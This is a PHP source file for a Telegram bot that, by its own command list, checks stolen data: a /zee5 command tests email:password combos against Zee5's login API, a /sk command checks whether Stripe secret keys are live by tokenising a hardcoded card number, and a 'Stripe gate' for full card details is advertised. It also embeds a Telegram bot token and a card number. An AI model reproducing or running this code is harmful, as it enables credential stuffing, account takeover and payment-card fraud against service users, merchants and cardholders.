<?php

#----------------- [BOT Tele] --------------------------#

#------------------[ Version 1.0 ] ------------------------#

$botToken = "1925075909:AAEtJqyjnr4QLpK_z09r3pSeWLvZ47rfcbI"; # ENTER HERE BOT TOKEN
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

#------------------[Start]-------------#
if ((strpos($message, "!start") === 0)||(strpos($message, "/start") === 0)){
sendMessage($chatId, "<i>Hello $firstname now you can use /cmds%0A%0ABot Made by Aamir </i>");
}
#----------- [ COMMANDS ] --------#
elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<i>BIN: /bin 461046%0AINFO: /info Know Yourself%0ASK CHECK: /sk sk_xyz%0ASTRIPE GATE: /ass cc|mon|yy|cvv%0AZee5 Checker: /zee5 mail:pass%0A%0ABot Made by Aamir </i>");
}
#------------[User Info]---------#
elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<i>YOUR ID: <code>$userId</code>%0AFirst Name: $firstname%0AUsername: @$username%0A%0ABot Made by Aamir </i>");
}
#---------------[BIN CODE]------------------#
elseif ((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)){
// Code here
}

#---------------------------------------------[ RESPONSES ]------------------------------------#


#----------------[ Zee5 ]------------------#
if (strpos($message, "/zee5") === 0){
$combo = substr($message, 6);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Kolkata');
$date1 = date('yy-m-d');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;
};
$email = multiexplode(array(":", "|", ""), $combo)[0];
$pass = multiexplode(array(":", "|", ""), $combo)[1];
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

$resultmann = file_get_contents('https://userapi.zee5.com/v1/user/loginemail?email='.$email.'&password='.$pass.'');
$token = trim(strip_tags(GetStr($resultmann,'{"token":"','"}')));

if($token){
sendMessage($chatId, "<b>ZEE5 Account:</b>%0A<b>EMAIL:PASS</b> <code>$combo</code>%0A<b>Response:</b> <b>Successfully Logged in</b>%0A<b>Checked By:</b> @$username%0A%0A<i>Bot Made by Aamir</i>");
}else{
sendMessage($chatId, "<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>Wrong Email or Password</b>%0A<b>Checked By:</b> @$username%0A%0A<i>Bot Made by Aamir</i>");
};
curl_close($ch);
ob_flush();
}

#-------------------[Sk Key Check Command]---------------------#

elseif ((strpos($message, "!sk") === 0)||(strpos($message, "/sk") === 0)){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<i>DEAD KEY</i>%0A<i>KEY:</i> <code>$sec</code>%0A<i>REASON:</i> EXPIRED KEY%0A%0A<b>Bot Made by Aamir </b>");
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<i>DEAD KEY</i>%0A<i>KEY:</i> <code>$sec</code>%0A<i>REASON:</i> INVALID KEY%0A%0A<b>Bot Made by Aamir </b>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<i>DEAD KEY</i>%0A<i>KEY:</i> <code>$sec</code>%0A<i>REASON:</i> Testmode Charges Only%0A%0A<b>Bot Made by Aamir★ </b>");
}else{
sendMessage($chatId, "<i>LIVE KEY</i>%0A<i>KEY:</i> <code>$sec</code>%0A<i>Message: </i> SK LIVE%0A%0A<b>Bot Made by Aamir </b>");
}}

#----------------------------------------------#
function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}

#------- VERSION 1.0

?>